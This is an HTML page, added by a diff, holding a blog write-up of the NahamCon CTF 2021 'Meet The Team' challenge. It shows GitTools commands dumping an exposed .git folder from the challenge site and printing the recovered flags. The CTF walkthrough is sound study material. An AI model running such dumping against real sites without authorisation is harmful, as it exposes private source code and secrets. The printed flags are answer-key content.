@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=7ffef42dae26353524a6dbf74721efac859862ec">
+    <link rel="shortcut icon" type="image/png" href="http://0.0.0.0:4000/assets/images/shinris3n.png">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Meet The Team | 当て身 Atemi</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Meet The Team" />
+<meta name="author" content="shinris3n" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Challenge Text" />
+<meta property="og:description" content="Challenge Text" />
+<link rel="canonical" href="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Meet-The-Team.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Meet-The-Team.html" />
+<meta property="og:site_name" content="当て身 Atemi" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-14T23:38:00-05:00" />
+<script type="application/ld+json">
+{"headline":"Meet The Team","url":"http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Meet-The-Team.html","dateModified":"2021-03-14T23:38:00-05:00","datePublished":"2021-03-14T23:38:00-05:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Meet-The-Team.html"},"author":{"@type":"Person","name":"shinris3n"},"description":"Challenge Text","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1><a href = '/' style = "text-decoration:none;color:#b5e853;" >当て身 Atemi</a></h1>
+        <h2>A Cybersecurity blog by shinris3n <br> 👊 <a href = "/writeups">Writeups</a> 👊 <a href = "/news">News</a> 👊 <a href = "/resources">Resources</a> <br></h2>
+        <h5>Part of the <a href="https://www.ninpwn.com" target="_blank">Ninpwn</a> Network</h5>
+      </div>
+    </header>
+
+    <div class="container">
+      <a href="http://0.0.0.0:4000"><img src="http://0.0.0.0:4000/assets/images/shinris3n_banner_transparent.png" width="25%" height="25%" alt="shinris3n" title="shinris3n home page link"></a>
+      <section id="main_content">
+        <h5><a href="#" onclick="history.go(-1)"> &lt;&lt; back </a></h5><br>
+
+
+<small>14 March 2021</small>
+<h1>Meet The Team</h1>
+
+
+
+
+ <small><font color="b5e853">Challenge Source: <em>NahamCon CTF 2021</em></font></small>
+
+<br>
+
+  <small><font color="b5e853">Challenge Category: <em>mission</em></font></small>
+
+
+<h1></h1>
+<h3><font color="FF3030">Challenge Text</font></h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Author: @JohnHammond#6971
+
+Recover the list of employees working at CONSTELLATIONS.
+
+With the flag of this challenge, you should find new information that will help with future challenges.
+
+You should find the flag for this challenge ON THIS constellations.page website. You will not find it on GitHub.
+
+HINT: "Can we please stop sharing our version control software out on our website?"
+
+HINT AGAIN: you are looking for a publicly accessible version control software folder published on the constellations.page website itself
+
+After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
+</code></pre></div></div>
+
+<h1></h1>
+<h3><font color="FF3030">Solution</font></h3>
+
+<ul>
+  <li>The hint for this challenge was the quote in the source code at https://constellations.page/meet-the-team.html:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- Vela, can we please stop sharing our version control software out on the public internet? --&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>We see a Github link at the bottom of the page, which leads us to try:</li>
+</ul>
+
+<p><img src="/assets/writeups/NahamConCTF2021/1b7d7180a341438f8014c69f21325f0b.png" alt="7f58c2422d6e80aa968d023dd1f79279.png" /></p>
+
+<ul>
+  <li>
+    <p>We can’t browse the directory structure, unfortunately, so we have to try to access default files and figure out a path from there.  There is an excellent resource <a href="https://medium.com/swlh/hacking-git-directories-e0e60fa79a36" target="_blank">here</a> discussing some manual ways to discover files.</p>
+  </li>
+  <li>
+    <p>The path of least resistance, however, is automating this process via <a href="https://github.com/internetwache/GitTools" target="_blank">GitTools</a>.  Armed with this, we can run the “Dumper” tool first to find and pull the relevant contents from the site. (Note:  Having spaces in your path breaks this script, so check for this first.)</p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">─<span class="nv">$ </span>bash gitdumper.sh http://constellations.page/.git/ ./git_pages_dump
+<span class="c">###########</span>
+<span class="c"># GitDumper is part of https://github.com/internetwache/GitTools</span>
+<span class="c">#</span>
+<span class="c"># Developed and maintained by @gehaxelt from @internetwache</span>
+<span class="c">#</span>
+<span class="c"># Use at your own risk. Usage might be illegal in certain circumstances. </span>
+<span class="c"># Only for educational purposes!</span>
+<span class="c">###########</span>
+
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Destination folder does not exist
+<span class="o">[</span>+] Creating ./git_pages_dump/.git/
+<span class="o">[</span>+] Downloaded: HEAD
+<span class="o">[</span>-] Downloaded: objects/info/packs
+<span class="o">[</span>+] Downloaded: description
+<span class="o">[</span>+] Downloaded: config
+<span class="o">[</span>+] Downloaded: COMMIT_EDITMSG
+<span class="o">[</span>+] Downloaded: index
+<span class="o">[</span>-] Downloaded: packed-refs
+<span class="o">[</span>+] Downloaded: refs/heads/master
+<span class="o">[</span>-] Downloaded: refs/remotes/origin/HEAD
+<span class="o">[</span>-] Downloaded: refs/stash
+<span class="o">[</span>+] Downloaded: logs/HEAD
+<span class="o">[</span>+] Downloaded: logs/refs/heads/master
+<span class="o">[</span>-] Downloaded: logs/refs/remotes/origin/HEAD
+<span class="o">[</span>-] Downloaded: info/refs
+<span class="o">[</span>+] Downloaded: info/exclude
+<span class="o">[</span>-] Downloaded: /refs/wip/index/refs/heads/master
+<span class="o">[</span>-] Downloaded: /refs/wip/wtree/refs/heads/master
+<span class="o">[</span>+] Downloaded: objects/e7/d4663ac6b436f95684c8bfc428cef0d7731455
+<span class="o">[</span>+] Downloaded: objects/8e/9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073
+<span class="o">[</span>-] Downloaded: objects/00/00000000000000000000000000000000000000
+<span class="o">[</span>+] Downloaded: objects/11/42cc3145fdba8d9eb8f9c9e7ee79bdfda64d9a
+<span class="o">[</span>+] Downloaded: objects/87/b17a86409582c162e260795afdf104dc1d46b1
+...</code></pre></figure>
+
+<ul>
+  <li>Next, we need to run the extractor script, which tries to iterate through the repo and recreate the contents by analyzing the commits.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"> 
+
+bash extractor.sh ./git_pages_dump ./git_pages_extracted
+<span class="c">###########</span>
+<span class="c"># Extractor is part of https://github.com/internetwache/GitTools</span>
+<span class="c">#</span>
+<span class="c"># Developed and maintained by @gehaxelt from @internetwache</span>
+<span class="c">#</span>
+<span class="c"># Use at your own risk. Usage might be illegal in certain circumstances. </span>
+<span class="c"># Only for educational purposes!</span>
+<span class="c">###########</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Destination folder does not exist
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating...
+<span class="o">[</span>+] Found commit: 8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073
+<span class="o">[</span>+] Found folder: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets
+<span class="o">[</span>+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/.DS_Store
+<span class="o">[</span>+] Found folder: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/css
+<span class="o">[</span>+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/css/grayscale.css
+<span class="o">[</span>+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/css/grayscale.min.css
+<span class="o">[</span>+] Found folder: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts                                                                     
+<span class="o">[</span>+] Found folder: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap                                                           
+<span class="o">[</span>+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.eot                            
+<span class="o">[</span>+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.svg                            
+<span class="o">[</span>+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.ttf                            
+<span class="o">[</span>+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.woff                           
+<span class="o">[</span>+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.woff2
+...</code></pre></figure>
+
+<ul>
+  <li>Finally, it’s just a matter of finding the flag in the reconstructed content.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">ls
+</span>0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073
+1-0780dea9ede681b1e4276d74740bb11056d97c39
+2-e7d4663ac6b436f95684c8bfc428cef0d7731455
+3-4c88ac1c56fe228267cf415c3ef87d7c3b8abd60
+4-1142cc3145fdba8d9eb8f9c9e7ee79bdfda64d9a
+5-87b17a86409582c162e260795afdf104dc1d46b1
+
+<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"flag{"</span>
+3-4c88ac1c56fe228267cf415c3ef87d7c3b8abd60/meet-the-team.html:            &lt;<span class="o">!</span><span class="nt">--</span> &lt;li&gt;&lt;h4&gt;&lt;b&gt;flag<span class="o">{</span>4063962f3a52f923ddb4411c139dd24c<span class="o">}</span>&lt;/b&gt;&lt;/h4&gt;&lt;/li&gt; <span class="nt">--</span><span class="o">&gt;</span>
+2-e7d4663ac6b436f95684c8bfc428cef0d7731455/robots.txt:flag<span class="o">{</span>33b5240485dda77430d3de22996297a1<span class="o">}</span>
+1-0780dea9ede681b1e4276d74740bb11056d97c39/meet-the-team.html:            &lt;<span class="o">!</span><span class="nt">--</span> &lt;li&gt;&lt;h4&gt;&lt;b&gt;flag<span class="o">{</span>4063962f3a52f923ddb4411c139dd24c<span class="o">}</span>&lt;/b&gt;&lt;/h4&gt;&lt;/li&gt; <span class="nt">--</span><span class="o">&gt;</span>
+1-0780dea9ede681b1e4276d74740bb11056d97c39/robots.txt:flag<span class="o">{</span>33b5240485dda77430d3de22996297a1<span class="o">}</span>
+0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/robots.txt:flag<span class="o">{</span>33b5240485dda77430d3de22996297a1<span class="o">}</span></code></pre></figure>
+
+
+
+
+  <small>Tags: <em>NahamConCTF2021</em></small>
+
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
